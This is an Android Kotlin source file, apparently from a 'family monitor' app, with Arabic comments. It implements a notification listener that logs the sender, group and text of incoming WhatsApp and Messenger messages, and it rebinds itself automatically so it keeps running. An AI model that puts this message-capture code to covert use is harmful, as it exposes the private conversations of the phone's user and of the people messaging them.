package com.family.monitor

import android.app.Notification
import android.content.ComponentName
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

/**
 * رصد رسائل واتساب المستلمة عبر الإشعارات — الرسمي + كل النسخ المعدلة.
 *
 * ما يُسجَّل (وارد فقط — الصادر من خدمة إمكانية الوصول):
 *  - الرسائل الواردة من الأشخاص: اسم المرسل + نص الرسالة.
 *  - الرسائل الواردة في المجموعات: اسم المجموعة + اسم المرسل داخلها + نص الرسالة.
 *  - من الرسمي (com.whatsapp) ومن WhatsApp Business ومن GB/FM/Yo/Plus وغيرها.
 *
 * ما لا يمكن تسجيله من الإشعارات: الرسائل الصادرة (لا تصدر إشعارًا) —
 * لذلك تُرصد الصادرة من خدمة إمكانية الوصول أثناء الكتابة والإرسال.
 *
 * يجب منح صلاحية «الوصول إلى الإشعارات» من إعدادات النظام مرة واحدة.
 */
class WhatsappNotificationService : NotificationListenerService() {

    companion object {
        // عناوين إشعارات واتساب الداخلية التي لا تمثل رسائل
        private val NOISE_TITLES = listOf(
            "whatsapp", "واتساب", "إعادة الاتصال", "reconnecting",
            "جارٍ التحميل", "downloading", "تحديث", "backup", "نسخ احتياطي",
            "checking for messages", "connectivity", "battery"
        )

        // منع التكرار: بصمة الرسالة → وقت تسجيلها
        private val fingerprints = mutableMapOf<String, Long>()
        // واتساب يعيد نشر الإشعار نفسه عدة مرات (مع كل رسالة جديدة وعند فتح القفل).
        // بصمة رسائل MessagingStyle تشمل وقت الرسالة نفسه، لذا:
        //  - نفس الرسالة المنشورة من جديد ← بصمتان متطابقتان ← تُتجاهَل (لا تكرار).
        //  - نص متكرر أُرسل مرتين ← وقتان مختلفان ← تُسجَّلان معًا (لا رسائل مفقودة).
        private const val DEDUPE_MS = 30 * 60_000L

        /**
         * هل الخدمة مربوطة الآن مع النظام؟
         * يحدّثها النظام عبر onListenerConnected / onListenerDisconnected.
         * يستخدمها Watchdog وMonitorService لضمان إعادة الربط بعد إعادة تشغيل الجهاز.
         */
        @Volatile
        var listenerConnected: Boolean = false

        /** طلب إعادة ربط الخدمة من النظام (بعد إعادة التشغيل أو انقطاع الخدمة) */
        fun requestRebindNow(context: Context) {
            try {
                NotificationListenerService.requestRebind(
                    ComponentName(context, WhatsappNotificationService::class.java)
                )
            } catch (e: Exception) {
                android.util.Log.e("WhatsappNotif", "تعذرت إعادة الربط", e)
            }
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        val pkg = sbn.packageName ?: return
        val msgnr = Config.isMessenger(pkg)
        if (!Config.isWhatsApp(pkg) && !msgnr) return

        val notification = sbn.notification ?: return
        if (sbn.isOngoing) return  // إشعارات مستمرة (اتصال جارٍ، تحميل...) ليست رسائل

        val extras = notification.extras ?: return

        // ---------- قراءة الرسائل: MessagingStyle أولاً (أدق — تشمل المرسل والمجموعة) ----------
        val messages = extractMessagingMessages(extras)
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""

        // منع تكرار نفس الإشعار (واتساب يحدّث الإشعار نفسه عدة مرات)
        val now = System.currentTimeMillis()
        fingerprints.entries.removeAll { it.value < now - DEDUPE_MS }

        if (messages.isNotEmpty()) {
            for (m in messages) {
                val sender = m.sender?.trim().orEmpty()
                val body = m.text?.trim().orEmpty()
                if (body.isEmpty()) continue
                val group = m.groupName?.trim().orEmpty()
                val fp = "$pkg|${group.ifBlank { sender }}|$sender|$body|${m.ts}"
                if (fingerprints.containsKey(fp)) continue
                fingerprints[fp] = now
                record(pkg, msgnr, contact = group.ifBlank { sender }, sender = sender, text = body, group = group.isNotEmpty())
            }
            return
        }

        // ---------- الطريقة القديمة: EXTRA_TITLE + EXTRA_TEXT ----------
        if (title.isEmpty() || text.isEmpty()) return
        if (text == "رسالة جديدة" || text.equals("new message", ignoreCase = true)) return
        val titleIsNoise = NOISE_TITLES.any { title.contains(it, ignoreCase = true) }
        var contact = title
        var sender = title
        var body = text
        if (titleIsNoise) {
            // الإشعار المجمّع: عنوانه اسم التطبيق ونصه غالبًا «اسم المرسل: الرسالة» —
            // نستخرج اسم المرسل بدل إنشاء مجلد عام باسم التطبيق
            val sep = text.indexOf(": ")
            if (sep in 1..80) {
                contact = text.substring(0, sep).trim()
                sender = contact
                body = text.substring(sep + 2).trim()
            } else {
                contact = if (msgnr) "ماسنجر" else "واتساب"
                sender = contact
            }
        }
        val fp = "legacy|$pkg|$contact|$text"
        if (fingerprints.containsKey(fp)) return
        fingerprints[fp] = now
        record(pkg, msgnr, contact = contact, sender = sender, text = body, group = false)
    }

    private fun record(pkg: String, msgnr: Boolean, contact: String, sender: String, text: String, group: Boolean) {
        if (contact.isBlank()) return
        // إشعارات المجموعات أحيانًا تصل بعنوان «اسم المجموعة : اسم المرسل» — نفصل الاسمين
        // حتى يكون مجلد المجموعة باسمها فقط والمرسل يظهر داخل تفاصيل الرسالة
        var c = contact.trim()
        var s = sender.trim()
        val sep = c.lastIndexOf(" : ")
        if (sep > 0 && sep < c.length - 3) {
            val grp = c.substring(0, sep).trim()
            val who = c.substring(sep + 3).trim()
            if (grp.isNotEmpty() && who.isNotEmpty()) {
                c = grp
                if (s.isBlank() || s == contact.trim()) s = who
            }
        }
        if (c.isBlank()) return
        val meta = JSONObject().put("text", text.take(500))
        if (group && s.isNotBlank() && s != c) {
            meta.put("sender", s.take(120)).put("group", true)
        }
        val json = JSONObject()
            .put("type", if (msgnr) "MESSENGER" else "WHATSAPP")
            .put("direction", "INCOMING")
            .put("title", c.take(120))     // اسم الشخص أو اسم المجموعة
            .put("app", chatLabel(pkg))
            .put("packageName", pkg)
            .put("meta", meta)
        EventStore.addEvent(applicationContext, json)
    }

    // ---------- استخراج رسائل MessagingStyle ----------

    private data class Msg(val sender: String?, val text: String?, val groupName: String?, val ts: Long)

    private fun extractMessagingMessages(extras: Bundle): List<Msg> {
        val out = mutableListOf<Msg>()
        try {
            val arr = if (Build.VERSION.SDK_INT >= 24) {
                extras.getParcelableArray(Notification.EXTRA_MESSAGES)
            } else null
            val displayName = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()

            if (arr != null) {
                for (item in arr) {
                    if (item is Notification.MessagingStyle.Message) {
                        val person = item.senderPerson
                        out.add(
                            Msg(
                                sender = person?.name?.toString(),
                                text = item.text?.toString(),
                                groupName = displayName,
                                // وقت الرسالة كما ضبطه واتساب — ثابت عبر إعادة نشر الإشعار
                                ts = item.timestamp
                            )
                        )
                    }
                }
                if (out.isNotEmpty()) return out
            }

            // احتياط للنسخ المعدلة التي تنسخ البيانات في حقول إضافية
            val history = extras.getCharSequenceArray(Notification.EXTRA_MESSAGES)?.toList()
            if (history != null && history.isNotEmpty()) {
                for (line in history) {
                    val t = line?.toString() ?: continue
                    val sep = t.indexOf(':')
                    if (sep in 1 until t.length) {
                        out.add(Msg(sender = t.substring(0, sep), text = t.substring(sep + 1).trim(), groupName = displayName, ts = 0))
                    } else {
                        out.add(Msg(sender = displayName, text = t, groupName = displayName, ts = 0))
                    }
                }
            }
        } catch (_: Exception) {
        }
        return out
    }

    private fun chatLabel(pkg: String): String = when (pkg.lowercase()) {
        "com.facebook.orca" -> "ماسنجر"
        "com.facebook.mlite" -> "Messenger Lite"
        "com.facebook.lite" -> "فيسبوك لايت"
        "com.whatsapp" -> "WhatsApp"
        "com.whatsapp.w4b" -> "WhatsApp Business"
        "com.gbwhatsapp", "com.gbwhatsm", "com.gbwhatsw4b" -> "GBWhatsApp"
        "com.fmwhatsapp" -> "FMWhatsApp"
        "com.yowhatsapp", "com.yowhatsm" -> "YoWhatsApp"
        "com.whatsappplus", "com.wplus" -> "WhatsApp Plus"
        else -> if (Config.isMessenger(pkg)) "ماسنجر" else "WhatsApp"
    }

    override fun onListenerConnected() {
        // الخدمة مربوطة الآن — تسجيل الرسائل الجديدة يعمل
        listenerConnected = true
    }

    override fun onListenerDisconnected() {
        // انفصلت الخدمة (تعطل أو قتلها النظام) — أعد الربط تلقائيًا فورًا
        // (وبأي حال، Watchdog يتحقق كل 15 دقيقة ويعيد الربط إن استمر الانقطاع)
        listenerConnected = false
        requestRebindNow(applicationContext)
    }

    override fun onDestroy() {
        listenerConnected = false
        super.onDestroy()
    }
}
